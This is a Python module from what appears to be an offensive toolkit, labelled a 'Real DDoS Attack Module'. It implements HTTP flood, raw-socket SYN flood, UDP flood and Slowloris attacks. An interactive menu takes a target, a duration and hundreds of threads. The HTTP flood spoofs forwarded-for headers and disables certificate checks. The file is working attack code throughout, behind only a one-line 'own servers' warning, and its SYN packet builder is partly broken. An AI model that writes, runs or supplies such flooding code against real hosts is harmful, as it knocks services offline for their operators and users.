#!/usr/bin/env python3
# DDOS FLOOD ASLI - Real DDoS Attack Module
# Multi-threaded HTTP/SYN/UDP Flood

import socket
import threading
import time
import random
import requests
import ssl
from urllib.parse import urlparse
from core.colors import Colors

class DDoSFlood:
    def __init__(self):
        self.name = "DDoS Flood Attack"
        self.running = False
        self.stats = {
            'sent': 0,
            'failed': 0,
            'start_time': 0
        }
    
    def http_flood(self, url, duration, threads):
        """HTTP/HTTPS Flood - Layer 7 DDoS"""
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"
        
        # Headers random
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        referers = [
            'https://google.com',
            'https://facebook.com',
            'https://youtube.com',
            'https://twitter.com',
            'https://instagram.com'
        ]
        
        def flood():
            while self.running:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Referer': random.choice(referers),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    
                    if parsed.scheme == 'https':
                        requests.get(url, headers=headers, verify=False, timeout=3)
                    else:
                        requests.get(url, headers=headers, timeout=3)
                    
                    self.stats['sent'] += 1
                except:
                    self.stats['failed'] += 1
        
        # Start threads
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
    
    def syn_flood(self, target_ip, target_port, duration, threads):
        """SYN Flood - Layer 4 DDoS (Raw Socket)"""
        def syn_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                packet = b'\x45\x00\x00\x28'  # IP header
                packet += b'\x00\x01\x00\x00'  # ID, flags
                packet += b'\x40\x06\x00\x00'  # TTL, protocol
                packet += socket.inet_aton(target_ip)  # Source IP random
                packet += socket.inet_aton(target_ip)  # Dest IP
                packet += b'\x00\x50\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x20\x00\x00\x00\x00\x00'
                
                while self.running:
                    try:
                        sock.sendto(packet, (target_ip, target_port))
                        self.stats['sent'] += 1
                    except:
                        self.stats['failed'] += 1
            except PermissionError:
                print(f"{Colors.RED}[!] SYN Flood requires root!{Colors.END}")
                self.running = False
        
        for _ in range(threads):
            t = threading.Thread(target=syn_flood)
            t.daemon = True
            t.start()
    
    def udp_flood(self, target_ip, target_port, duration, threads, packet_size=1024):
        """UDP Flood - Layer 4 DDoS"""
        def udp_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(packet_size)
                
                while self.running:
                    try:
                        sock.sendto(packet, (target_ip, target_port))
                        self.stats['sent'] += 1
                    except:
                        self.stats['failed'] += 1
            except:
                pass
        
        for _ in range(threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            t.start()
    
    def slowloris(self, target_ip, target_port, duration, sockets):
        """Slowloris Attack - Keep connections open"""
        def slowloris_attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                sock.send(f"GET /?{random.random()} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())
                
                while self.running:
                    try:
                        sock.send(f"X-Header: {random.random()}\r\n".encode())
                        time.sleep(10)
                    except:
                        break
            except:
                pass
        
        for _ in range(sockets):
            t = threading.Thread(target=slowloris_attack)
            t.daemon = True
            t.start()
    
    def show_stats(self):
        """Display real-time stats"""
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            speed = self.stats['sent'] / elapsed if elapsed > 0 else 0
            print(f"\r{Colors.CYAN}[*] Packets: {self.stats['sent']} | Speed: {speed:.0f} pkt/s | Failed: {self.stats['failed']}{Colors.END}", end="")
            time.sleep(1)
    
    def run(self):
        print(f"\n{Colors.RED}{Colors.BOLD}{'═'*55}{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}💀 DDOS FLOOD ATTACK - REAL MODE 💀{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}{'═'*55}{Colors.END}")
        print(f"{Colors.YELLOW}[!] WARNING: This is a REAL DDoS attack!{Colors.END}")
        print(f"{Colors.YELLOW}[!] Use only on your own servers!{Colors.END}\n")
        
        confirm = input(f"{Colors.RED}[?] I understand the risk (y/n) > {Colors.END}")
        if confirm.lower() != 'y':
            return
        
        print(f"\n{Colors.GREEN}[1]{Colors.END} HTTP Flood (Layer 7)")
        print(f"{Colors.GREEN}[2]{Colors.END} SYN Flood (Layer 4 - Root)")
        print(f"{Colors.GREEN}[3]{Colors.END} UDP Flood (Layer 4)")
        print(f"{Colors.GREEN}[4]{Colors.END} Slowloris")
        
        choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        if choice == '1':
            url = input(f"{Colors.GREEN}Target URL > {Colors.END}")
            duration = int(input(f"{Colors.GREEN}Duration (seconds) > {Colors.END}") or "60")
            threads = int(input(f"{Colors.GREEN}Threads (500) > {Colors.END}") or "500")
            
            print(f"\n{Colors.RED}[!] Starting HTTP Flood on {url}{Colors.END}")
            print(f"{Colors.RED}[!] Duration: {duration}s | Threads: {threads}{Colors.END}")
            
            self.running = True
            self.stats['start_time'] = time.time()
            
            # Start stats thread
            stats_thread = threading.Thread(target=self.show_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            # Start attack
            self.http_flood(url, duration, threads)
            
            time.sleep(duration)
            self.running = False
            print(f"\n{Colors.GREEN}[+] Attack finished! Total packets: {self.stats['sent']}{Colors.END}")
        
        elif choice == '2':
            target_ip = input(f"{Colors.GREEN}Target IP > {Colors.END}")
            target_port = int(input(f"{Colors.GREEN}Target Port (80) > {Colors.END}") or "80")
            duration = int(input(f"{Colors.GREEN}Duration (seconds) > {Colors.END}") or "60")
            threads = int(input(f"{Colors.GREEN}Threads (500) > {Colors.END}") or "500")
            
            print(f"\n{Colors.RED}[!] Starting SYN Flood on {target_ip}:{target_port}{Colors.END}")
            print(f"{Colors.RED}[!] Duration: {duration}s | Threads: {threads}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Run with: sudo python3 duality.py{Colors.END}")
            
            self.running = True
            self.stats['start_time'] = time.time()
            
            stats_thread = threading.Thread(target=self.show_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            self.syn_flood(target_ip, target_port, duration, threads)
            
            time.sleep(duration)
            self.running = False
            print(f"\n{Colors.GREEN}[+] Attack finished! Total packets: {self.stats['sent']}{Colors.END}")
        
        elif choice == '3':
            target_ip = input(f"{Colors.GREEN}Target IP > {Colors.END}")
            target_port = int(input(f"{Colors.GREEN}Target Port > {Colors.END}"))
            duration = int(input(f"{Colors.GREEN}Duration (seconds) > {Colors.END}") or "60")
            threads = int(input(f"{Colors.GREEN}Threads (500) > {Colors.END}") or "500")
            packet_size = int(input(f"{Colors.GREEN}Packet size (1024) > {Colors.END}") or "1024")
            
            print(f"\n{Colors.RED}[!] Starting UDP Flood on {target_ip}:{target_port}{Colors.END}")
            print(f"{Colors.RED}[!] Duration: {duration}s | Threads: {threads}{Colors.END}")
            
            self.running = True
            self.stats['start_time'] = time.time()
            
            stats_thread = threading.Thread(target=self.show_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            self.udp_flood(target_ip, target_port, duration, threads, packet_size)
            
            time.sleep(duration)
            self.running = False
            print(f"\n{Colors.GREEN}[+] Attack finished! Total packets: {self.stats['sent']}{Colors.END}")
        
        elif choice == '4':
            target_ip = input(f"{Colors.GREEN}Target IP > {Colors.END}")
            target_port = int(input(f"{Colors.GREEN}Target Port (80) > {Colors.END}") or "80")
            duration = int(input(f"{Colors.GREEN}Duration (seconds) > {Colors.END}") or "60")
            sockets = int(input(f"{Colors.GREEN}Sockets (500) > {Colors.END}") or "500")
            
            print(f"\n{Colors.RED}[!] Starting Slowloris on {target_ip}:{target_port}{Colors.END}")
            print(f"{Colors.RED}[!] Duration: {duration}s | Sockets: {sockets}{Colors.END}")
            
            self.running = True
            self.stats['start_time'] = time.time()
            
            self.slowloris(target_ip, target_port, duration, sockets)
            
            time.sleep(duration)
            self.running = False
            print(f"\n{Colors.GREEN}[+] Attack finished!{Colors.END}")

if __name__ == "__main__":
    ddos = DDoSFlood()
    ddos.run()
